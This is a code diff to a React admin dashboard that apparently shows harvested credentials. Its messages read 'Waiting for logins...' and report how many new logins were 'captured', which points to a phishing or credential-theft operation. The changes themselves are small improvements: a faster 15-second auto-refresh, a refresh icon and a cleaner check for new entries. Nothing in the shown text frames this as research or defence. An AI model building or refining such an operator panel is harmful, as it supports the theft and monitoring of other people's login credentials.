@@ -13,7 +13,7 @@ import {
   TableRow,
 } from "@/components/ui/table";
 import { formatDistanceToNow } from 'date-fns';
-import { Loader2 } from 'lucide-react';
+import { Loader2, RefreshCw } from 'lucide-react';
 
 const AdminDashboard = () => {
   const [credentials, setCredentials] = useState<Credential[]>([]);
@@ -25,10 +25,10 @@ const AdminDashboard = () => {
   useEffect(() => {
     loadCredentials();
     
-    // Set up auto-refresh every 30 seconds
+    // Set up auto-refresh every 15 seconds (reduced from 30 for faster updates)
     const intervalId = setInterval(() => {
       loadCredentials(true);
-    }, 30000);
+    }, 15000);
     
     return () => clearInterval(intervalId);
   }, []);
@@ -47,10 +47,14 @@ const AdminDashboard = () => {
       
       if (result.success) {
         console.log('Successfully loaded credentials:', result.data);
+        
+        // Check if we have new credentials before updating state
+        const hasNewCredentials = result.data.length !== credentials.length;
         setCredentials(result.data);
+        
         if (result.data.length === 0 && !isAutoRefresh) {
           toast.info('No credentials found. Waiting for logins...');
-        } else if (result.data.length !== credentials.length && isAutoRefresh) {
+        } else if (hasNewCredentials && isAutoRefresh) {
           const newCount = result.data.length - credentials.length;
           if (newCount > 0) {
             toast.success(`${newCount} new login${newCount > 1 ? 's' : ''} captured!`);
@@ -119,7 +123,12 @@ const AdminDashboard = () => {
                     <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                     Refreshing...
                   </>
-                ) : 'Refresh Data'}
+                ) : (
+                  <>
+                    <RefreshCw className="mr-2 h-4 w-4" />
+                    Refresh Data
+                  </>
+                )}
               </Button>
             </div>
           </div>
@@ -172,7 +181,7 @@ const AdminDashboard = () => {
                   Refreshing...
                 </span>
               ) : (
-                <span>Auto-refreshes every 30 seconds</span>
+                <span>Auto-refreshes every 15 seconds</span>
               )}
             </div>
           )}
